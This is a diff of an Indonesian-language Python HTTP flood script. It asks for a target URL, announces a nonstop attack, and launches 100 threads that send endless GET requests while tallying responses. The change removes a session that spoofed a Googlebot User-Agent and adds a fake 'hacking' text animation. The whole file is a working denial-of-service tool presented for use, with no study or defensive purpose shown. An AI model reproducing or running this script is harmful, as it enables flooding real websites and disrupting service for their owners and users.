@@ -2,6 +2,8 @@ import os
 import threading
 import requests
 import time
+import random
+import sys
 
 # Global counter
 total_sent = 0
@@ -9,12 +11,6 @@ total_failed = 0
 sent_last = 0
 failed_last = 0
 lock = threading.Lock()
-
-# Setup sesi koneksi reuse
-session = requests.Session()
-session.headers.update({
-    'User-Agent': 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)'
-})
 
 # Tampilan Header
 def banner():
@@ -42,27 +38,38 @@ def banner():
 \033[1;96m====================================================================\033[0m
 """)
 
+# Fungsi animasi teks hacker
+def hacking_text_animation():
+    text = "Hacking... Please Wait..."
+    for i in range(len(text)):
+        sys.stdout.write(text[i])
+        sys.stdout.flush()
+        time.sleep(random.uniform(0.05, 0.15))
+    sys.stdout.write("\n")
+    time.sleep(1)
+
 # Fungsi serangan
 def send_request(url):
     global total_sent, total_failed
     while True:
         try:
-            res = session.get(url, timeout=10)  # timeout sedikit lebih tinggi
+            res = requests.get(url, timeout=5)
             if res.status_code == 200:
                 with lock:
                     total_sent += 1
-                print("\033[1;92m[✓] Sukses ➡ 200\033[0m")
+                hacking_text_animation()
+                print("\033[1;92m[+] Request sent ➡ 200\033[0m")
             else:
-                # Retry kecil jika bukan 200
                 with lock:
                     total_failed += 1
-                print(f"\033[1;91m[×] Status {res.status_code}, retry...\033[0m")
-                time.sleep(0.1)
-        except Exception as e:
+                hacking_text_animation()
+                print(f"\033[1;91m[-] Gagal mengirim request! Status: {res.status_code}\033[0m")
+        except requests.RequestException as e:
             with lock:
                 total_failed += 1
-            print("\033[1;91m[!] Error koneksi, retry...\033[0m")
-            time.sleep(0.1)  # Retry setelah jeda kecil
+            hacking_text_animation()
+            print("\033[1;91m[-] Gagal mengirim request!\033[0m")
+            continue
 
 # Monitor RPS
 def rps_monitor():
@@ -82,8 +89,8 @@ def main():
     url = input("Masukkan URL Target: ")
     print(f"\n\033[1;92m[!] Menyerang {url} tanpa henti... CTRL+C untuk stop.\033[0m\n")
     
-    # Jalankan thread serangan (atur jumlah sesuai kemampuan)
-    for _ in range(100):  # bisa naik ke 200 kalau CPU & jaringan kuat
+    # Jalankan thread serangan
+    for _ in range(100):  # Kamu bisa ubah sesuai kemampuan perangkat/server
         threading.Thread(target=send_request, args=(url,), daemon=True).start()
 
     # Jalankan monitor RPS
